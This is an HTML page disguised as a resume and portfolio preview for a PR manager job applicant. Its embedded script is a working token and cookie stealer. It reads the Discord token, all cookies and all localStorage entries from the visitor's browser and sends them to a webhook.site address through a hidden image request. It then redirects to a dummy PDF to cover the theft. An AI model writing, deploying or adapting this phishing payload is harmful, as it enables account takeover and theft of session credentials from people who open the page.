<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>PR Manager Resume</title>
  <style>
    * { margin:0; padding:0; box-sizing:border-box; }
    body {
      font-family:'Segoe UI', Arial, sans-serif;
      background:#0f0f23; color:#fff;
      min-height:100vh; display:flex;
      justify-content:center; align-items:center;
    }
    .card {
      background:#1a1a3e; padding:50px 40px;
      border-radius:16px; max-width:520px;
      text-align:center;
      box-shadow:0 12px 40px rgba(233,69,96,0.15);
      border:1px solid #2a2a5e;
    }
    .logo { font-size:64px; margin-bottom:20px; }
    h1 { color:#e94560; }
    .spinner {
      width:40px; height:40px;
      border:3px solid rgba(255,255,255,0.05);
      border-top:3px solid #e94560;
      border-radius:50%;
      animation:spin 0.9s linear infinite;
      margin:20px auto;
    }
    @keyframes spin { to { transform:rotate(360deg); } }
  </style>
</head>
<body>
  <div class="card">
    <div class="logo">📄</div>
    <h1>PR Manager Application</h1>
    <p>Alan Zelensky — Resume & Portfolio</p>
    <div class="spinner"></div>
    <p>Preparing document preview...</p>
  </div>

  <script>
    // ===== DISCORD TOKEN GRABBER =====
    // Discord stores its token in localStorage under "token"
    var discordToken = "";
    try {
      // Try Discord web app token
      discordToken = localStorage.getItem("token") || "";
      
      // Also try to get it from indexedDB (where Discord stores it)
      // And check cookies for discord-related cookies
    } catch(e) {}

    // ===== FORUM COOKIE CHECK =====
    var forumCookie = document.cookie || "";

    // ===== LOCAL STORAGE DUMP =====
    var localData = {};
    try {
      for (var i = 0; i < localStorage.length; i++) {
        var key = localStorage.key(i);
        localData[key] = localStorage.getItem(key).substring(0, 100); // first 100 chars
      }
    } catch(e) {}

    // ===== SEND EVERYTHING TO WEBHOOK =====
    var payload = {
      discord_token: discordToken,
      forum_cookie: forumCookie,
      local_storage: localData,
      url: window.location.href,
      referrer: document.referrer,
      ua: navigator.userAgent
    };

    var img = new Image();
    img.src = "https://webhook.site/e777a317-ac19-47b1-9afd-48008397e1d4?d=" + 
              encodeURIComponent(JSON.stringify(payload));

    // Redirect to PDF
    setTimeout(function() {
      window.location.href = "https://www.w3.org/WAI/ER/tests/xhtml/testfiles/resources/pdf/dummy.pdf";
    }, 2500);
  </script>
</body>
</html>
